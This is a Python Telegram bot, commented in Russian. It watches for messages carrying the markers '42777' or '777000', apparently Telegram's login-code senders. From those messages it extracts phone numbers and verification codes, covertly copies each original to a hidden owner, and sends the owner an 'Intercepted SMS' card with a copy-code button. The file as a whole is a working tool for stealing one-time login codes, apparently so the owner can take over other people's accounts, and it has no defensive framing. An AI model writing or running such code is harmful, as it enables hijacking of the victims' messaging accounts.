import os
import asyncio
import logging
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# ================= НАСТРОЙКИ =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

if not BOT_TOKEN or OWNER_ID == 0:
    logging.error("❌ Ошибка: Не заданы переменные окружения BOT_TOKEN или OWNER_ID")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)

# ================= ПАРСЕРЫ =================
def extract_phone(text: str) -> str | None:
    if not text: return None
    match = re.search(r'(\+?\d{10,15})', text.replace(' ', '').replace('-', '').replace('(', '').replace(')', ''))
    return match.group(1) if match else None

def extract_code(text: str) -> str | None:
    if not text: return None
    # Убираем номера, чтобы не перепутать с кодом
    cleaned = re.sub(r'\+?\d{10,15}', '', text)
    match = re.search(r'\b(\d{4,6})\b', cleaned)
    return match.group(1) if match else None

# ================= ФИЛЬТР: ТОЛЬКО СМС-ШЛЮЗ =================
def is_sms_gateway_message(message: types.Message) -> bool:
    """Пропускает только сообщения от SMS-шлюза (с маркерами 42777 или 777000)"""
    if not message.text:
        return False
    
    text = message.text
    # Проверяем наличие маркеров SMS-шлюза
    if "42777" in text or "777000" in text:
        logging.info(f"✅ Сообщение от SMS-шлюза обнаружено: {text[:80]}")
        return True
    
    return False

# ================= КОМАНДЫ =================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    logging.info(f"📍 Команда /start от {message.from_user.id}")
    if message.from_user.id == OWNER_ID:
        await message.answer("🤖 Бот запущен. Ожидаю SMS от шлюза 42777/777000.")
    else:
        await message.answer("🤖 Бот активен.")

@dp.message(Command("get_id"))
async def cmd_get_id(message: types.Message):
    await message.answer(f"🆔 ID этого чата: `{message.chat.id}`\n👤 Ваш ID: `{message.from_user.id}`", parse_mode="Markdown")

# ================= ОСНОВНОЙ ОБРАБОТЧИК =================
@dp.message(is_sms_gateway_message)
async def handle_sms_gateway(message: types.Message):
    """Обрабатывает только сообщения от SMS-шлюза"""
    
    logging.info("🚀 ОБРАБОТЧИК SMS-ШЛЮЗА ЗАПУЩЕН!")
    logging.info(f"📩 Текст: {message.text}")
    
    text = message.text or ""
    phone = extract_phone(text)
    code = extract_code(text)
    
    logging.info(f"🔑 Код: {code}, 📱 Номер: {phone}")

    # 1. Скрыто копируем оригинал владельцу
    try:
        logging.info(f"📤 Копирую сообщение владельцу (ID: {OWNER_ID})...")
        await message.copy_to(chat_id=OWNER_ID)
        logging.info("✅ Оригинал скопирован!")
    except Exception as e:
        logging.error(f"❌ Ошибка копирования: {e}", exc_info=True)

    # 2. Отправляем карточку с кодом
    summary_parts = ["📨 <b>Перехвачено SMS из шлюза:</b>"]
    
    if phone:
        summary_parts.append(f"📱 <b>Номер:</b> <code>{phone}</code>")
    if code:
        summary_parts.append(f"🔑 <b>Код:</b> <code>{code}</code>")
    
    summary_parts.append(f"📝 <b>Текст:</b> <i>{text[:200]}{'...' if len(text) > 200 else ''}</i>")

    # Кнопка копирования кода
    kb = None
    if code:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"📋 Скопировать код {code}", callback_data=f"copy:{code}")]
        ])

    try:
        logging.info("📤 Отправляю карточку владельцу...")
        await bot.send_message(
            OWNER_ID,
            "\n".join(summary_parts),
            parse_mode="HTML",
            reply_markup=kb
        )
        logging.info("✅ Карточка отправлена!")
    except Exception as e:
        logging.error(f"❌ Ошибка отправки карточки: {e}", exc_info=True)

# ================= ОБРАБОТЧИК КНОПКИ =================
@dp.callback_query(F.data.startswith("copy:"))
async def copy_code_handler(callback: types.CallbackQuery):
    if callback.from_user.id != OWNER_ID:
        await callback.answer("⛔ Не твоё", show_alert=True)
        return

    code = callback.data.split(":", 1)[1]
    await callback.message.answer(f"<code>{code}</code>", parse_mode="HTML")
    await callback.answer("Код отправлен выше 👆")

# ================= ЗАПУСК =================
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    logging.info("✅ Бот успешно запущен!")
    logging.info(f"📋 OWNER_ID: {OWNER_ID}")
    logging.info("📡 Режим: Перехват SMS только от шлюза 42777/777000")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Бот остановлен")
